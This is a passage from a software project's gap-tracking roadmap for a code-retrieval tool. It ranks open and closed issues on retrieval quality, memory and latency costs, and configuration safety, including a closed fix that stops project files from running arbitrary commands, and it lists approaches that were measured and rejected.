| — | ~~**G5** rank + MRR~~ | closed by Task 1 (2026-09-04) — every retrieval row carries `rank`, the summary carries `mrr`, and the run reads 0.635; the 2026-09-03 rows cannot be rescored |
| — | ~~**G18** a non-ASCII path drops its file from `changes`~~ | closed 2026-09-09 — `-c core.quotepath=false` on both invocations, two tests over a scratch repository that pins the quoting on, the untracked listing asked for NUL-separated, and the ambient `GIT_DIR` dropped. A non-UTF-8 path and a decomposed one still lose their file, recorded in the section above. Raised 2026-09-07 by the Windows port's CI work, latent — `core.quotepath` is on by default, so `parse` reads no name from a quoted `+++` line and drops every hunk in that file, with Task 2's file-id fallback unreachable because no hunk exists. The pinned fixture has 0 such paths, so no recorded number moved on it. Above G1 because it is one argument on two `git` calls and it restores files that vanish today with nothing printed |
| 7 | **G1** unparsed files get a file node | the file half is closed by Task 2 (2026-09-04) against a `code_files` denominator; the symbol half is 57 Kotlin declarations and waits on 0.6.0's extractor |
| — | ~~**G3** the three impact diagnostics~~ | closed by Tasks 3 and 4 (2026-09-04) — 123/123 files over 16 targets, mean recall 1.0 |
| — | ~~**G4** grow the blast set~~ | closed by Task 5 (2026-09-04) — `blast.jsonl` is 32 cases and the per-suite decision rule is written down before the changes judged on it |
| 8 | **G2** fourteen paraphrases a neighbour away | the lever this row named is measured and rejected (2026-09-04): `--rerank-local` reads 17/30 against a control of 15/30, at 17.9 s a question; the gap stays open with nothing cheaper left to try |
| 9 | **G6** a case file per new corpus | the `impact` third is a written baseline (2026-09-04); `trace` and `changes` ship with the 0.6.0 languages, not after them |
| 10 | **G17** the constant's derivation set is the plan's own | raised 2026-09-06 — `c_code = 0.902` was taken on an 800-question mixed set fixed at equal halves in the design note before any dump, by the same plan that proposed the seat it judges. The order of operations held and is not what is weak; what is unmeasured is whether the verdict moves with the mix. Last because no verdict is known to have turned on it, and first among method gaps if the seat is retried |

## Suggested order — the cost family

G19 to G27 have an order of their own, and the numbers below rank them **against each other only**.
The table above orders how much of a real answer is missing; this one orders what the tool costs to
run and how much of that cost is still unmeasured. A 1 here does not outrank a 1 there — they
answer different questions, and no row below moves a retrieval floor.

| | gap | why here |
|---|---|---|
| 1 | **G23** the reader bars are tighter than the suite's own repeatability | every other row in this family is read through those bars, and the control already fails them on a change that touches no reader: `ask-fused` 0.58 s against 0.35, max RSS 1.36–1.56 GB on both binaries. n runs and a median, and it is fixed |
| 2 | ~~**G20** the whole-store run in the band has no wall~~ | ~~the second round's headline is a product of ratios — 4.1–4.5× of 1,930 s — because three attempts starved on a working laptop~~ — closed 2026-09-09 — the band was removed |
| 3 | **G19** the progress cadence is a count of rows | a fixed bar the plan set and the shipped code misses at both tails, 102.4 s and 96.7 s against 60, with the batching rule that would fix it already written one file away |
| 4 | **G22** mapped weights under memory pressure | a shipped default whose price is +6% to +26% of wall exactly on the machines that most need the 1.14 GB it saves, and all three candidate policies are unmeasured |
| 5 | ~~**G21** one platform measured, three reasoned~~ | ~~the largest unmeasured surface in the family, and the one that needs hardware this session did not have~~ — closed 2026-09-09 — the band was removed |
| — | ~~**G27** `serve`'s socket path and its leftover~~ | closed 2026-09-09 — the socket falls back to `$TMPDIR/repograph-<hash>.sock` when `.repograph/serve.sock` will not fit in `sun_path`, proved on a 230-byte repository path that could not bind at all before; and a `SIGTERM` sets a flag the loop reads, so the exit is the identity-checked one every other exit takes |
| ~~7~~ | ~~**G26** `serve` holds its model while idle~~ | **closed 2026-09-09** — `--idle-model`, default 300 s: 908.5 MB → 28.8 MB on the first drop, 277.6 MB on the second, 0.771 s for the ask that pays the open |
| 8 | **G25** the fp32 weights are the floor | the only lever that could move the floor under every memory number in both rounds, and finding out costs a full re-embed and the quantized model's own floors — no download at all on the default, whose int8 build is already cached, and 562 MB on the large one |
| 9 | **G24** `--rerank-local` is 31.9 s and 3.1 GB | the heaviest reader by far, and what would actually move it is a pool depth, which belongs to G2 and not to this family |

## Suggested order — the third family

G28 to G40 are ordered against each other only, as the cost family is. None of them moves a
recorded floor; two of them (G32, G36) are the ones to take before anyone rebuilds a store or
clones a repository they did not write.

| | gap | why here |
|---|---|---|
| — | ~~**G36** the project file runs any command~~ | closed 2026-09-09 — and it took two refusals, not one: the `*_command` keys became machine-file-only, and the model name, which is interpolated into that command unquoted and was never checked, is now a token or it is not used. One refused key would have left the second door open |
| 2 | **G32** a rebuilt enriched store is graded raw | the first thing anyone will hit after this branch merges: 150 nodes without questions and a bench that quietly grades against the raw floors. A stderr line and one `enrich` close it; the fixture's own rebuild is the recorded pair that says so |
| 3 | **G34** two copies of one grammar | the failure is silent — a re-extraction on every `update`, or a family no node is written in — and the property test that makes it a red test is one function over fixtures that already exist |
| 4 | **G39** the family set is an input to extraction | the design under G34: while the extractor needs the set, the two grammars must agree and a move costs a corpus read. It sits below G34 because the property test is what makes a divergence visible, and above everything else because it is the change that would make G34 unnecessary — and it is the one row here that could grow the store, so it is measured before it is taken |
| 5 | **G30** where the reranker's gains sit in the pool | the fourteen ranks decide whether G2 is really closed; every zero-token lever proposed since should be judged against them, and none can be until they are recorded |
| 6 | **G28** the reranked p90 straddles the ceiling | the arm cannot be floored while its own bar is what turns it red; a diff of two runs names the cause |
| 7 | **G29** the one paraphrase sonnet never picks | one `dump` says whether it is a snippet or a pool problem; small, and it is the whole distance to 30/30 |
| 8 | **G31** the token cost is bytes ÷ 4 of one prompt | the README's cost column is a caption; the bench should measure what it sends |
| 9 | **G37** no non-Claude number, no stacked levers | five runs on copies, all priced, none blocking anything; first among them the `e5-large` + reranker pair, because both halves are already measured alone |
| 10 | **G35** `derive` on every `update` | the no-op case is closed and measured, 1.00 s → 0.08 s cold; what is left is the `update` that does change a file, still expected to be milliseconds and still without a number |
| 11 | **G40** the empty set is a never-matching regex | a type change and a branch, no measurement to take; here rather than last because it is the cheapest row in the file and it removes a sentinel a reader has to decode |
| 12 | **G38** the report has no edge | a sort order and two columns; last because the report already shows both halves |
| — | **G33** thirteen families are text now | closed as accepted the day it was raised, with the names recorded; reopens on a recorded case that needs a mention-only family |

## What is explicitly not on this list

- **Importing graphify's edges.** Measured: 8 577 concept nodes and 23 117 edges move
  the shipped bench from 40/15/12 to 38/16/12. Rolled back, and ADR-001's reasoning
  says why more concept nodes do not help a question that shares no stem with its
  target.
- **More seeds and wider hops.** Both measured in ADR-001 and its amendments; each buys about one
  hit and pays in the token budget the bench exists to protect. **A different E5 size** was on this
  list for the same reason and is no longer: `e5-base` and `bge-m3` were measured without generated
  questions in the index, and re-measuring the size with them — G11, 2026-09-05 — read paraphrase
  22/30 against 15/30 and held-out 103 → 119. It pays in latency, memory and a 2.1 GB download
  rather than in tokens; it was the default from `35357c1` and is a one-line option again since
  2026-09-07 ([ADR-002](../adr/ADR-002-two-defaults-multiplied.md)), with `embed_model` the way to
  it.
- **Query rewriting by a model.** Measured at paraphrase 6/14 with keyword falling to
  20/24, and rejected.
- **The embedding session's other memory switches.** Spin-wait off (+21% wall for −12% average
  CPU), `memory_pattern` off (−0.9 GB for +11% wall in the first round, −0.11 GB of footprint for
  +10% in the second), arena shrinkage on every run (+13% wall with the footprint unmoved at
  1.74 GB, because the arena is given back after each forward and grown again before the next), and
  a smaller `TOKEN_BUDGET` at 1,024 and 512 (−0.12 and −0.19 GB of footprint on 320 long rows,
  where 512 only turns 8 × 256 forwards into 2 × 256, and on the short rows that are nine tenths of
  a store it would run about 1,300 forwards where the shipped budget runs 776 — unmeasured). Each
  measured on the harness against its own control and each rejected:
  [what every command costs](2026-09-07-resource-usage-results.md) §2 and
  [the unnoticeable results](2026-09-07-unnoticeable-results.md) §2.3.
- **The scheduling levers that are not the background band.** The utility band (the person's
  compile still +7.0%, so bar 1 fails), `threads = 6` under the band (−5% wall for +15%
  CPU-seconds and two points of the compile, because the six efficiency cores share one clock),
  `threads = 2` in the foreground (1.9× the wall and the compile still +9.1%), a 50% pacing duty
  cycle (2.15× the wall for the same CPU-seconds, a linear trade with nothing free in it), and
  per-thread `QOS_CLASS_BACKGROUND` (not inherited — ORT's workers are created inside
  `commit_from_file` and rayon's inside `build_global`, so two thread factories would be needed to
  reach what one `setpriority` call reaches). All in
  [the unnoticeable results](2026-09-07-unnoticeable-results.md) §2.1–2.3. **As of 2026-09-09 the
  band itself is not on this list either**: it shipped, it was measured, and it was removed
  ([the plan](../plans/2026-09-09-normal-band-only.md)) — the whole scheduling family is closed
  rather than deferred, and G20 and G21 closed moot with it. The `threads` rows above are historical
  in one further sense: the key is gone too, replaced by `resources`, and `threads = 6` is the row
  that chose what `full` resolves to. The int8 weights are
  **not** on this list: they were deferred rather than refused, and they are G25.
